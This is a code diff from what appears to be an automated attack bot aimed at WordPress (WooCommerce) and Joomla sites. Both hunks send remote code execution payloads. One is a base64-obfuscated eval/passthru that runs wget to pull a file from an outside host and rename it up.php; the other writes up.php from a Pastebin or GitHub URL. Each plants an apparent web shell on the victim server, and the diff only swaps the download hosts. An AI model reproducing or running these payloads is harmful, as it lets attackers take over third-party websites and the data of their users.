@@ -2267,7 +2267,7 @@ def wordpress(url):
 		#53 woocommerce
 		
 		
-		izfreq = requests.post(url+'/produits/?items_per_page=%24%7b%40eval(base64_decode(cGFzc3RocnUoJ2NkIHdwLWNvbnRlbnQvdXBsb2Fkcy8yMDE4LzAxO3dnZXQgaHR0cDovL3d3dy5hd3RjLmFpZHQuZWR1Ly9jb21wb25lbnRzL2NvbV9iMmpjb250YWN0L3VwbG9hZHMvdHh0LnR4dDttdiB0eHQudHh0IGl6b20ucGhwJyk7))%7d&setListingType=grid')
+		izfreq = requests.post(url+'/produits/?items_per_page=%24%7b%40eval(base64_decode(cGFzc3RocnUoJ2NkIHdwLWNvbnRlbnQvdXBsb2Fkcy8yMDE4LzAxO3dnZXQgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2aTIwMjAvdGVzdC9tYXN0ZXIvYm90L3VwLnR4dDttdiB1cC50eHQgdXAucGhwJyk7))%7d&setListingType=grid')
 		
 		izflib = requests.get(url+'/wp-content/uploads/2018/01/up.php')
 		
@@ -3662,7 +3662,7 @@ def joomlaaa(url):
 
 		#rce
 
-		pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/up.php','w+'),file_get_contents('https://pastebin.com/raw/7Rz3Zujk'));")
+		pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/up.php','w+'),file_get_contents('https://raw.githubusercontent.com/ivi2020/test/master/bot/7Rz3Zujk.txt'));")
 			
 		rce_url(url,pl)
 			
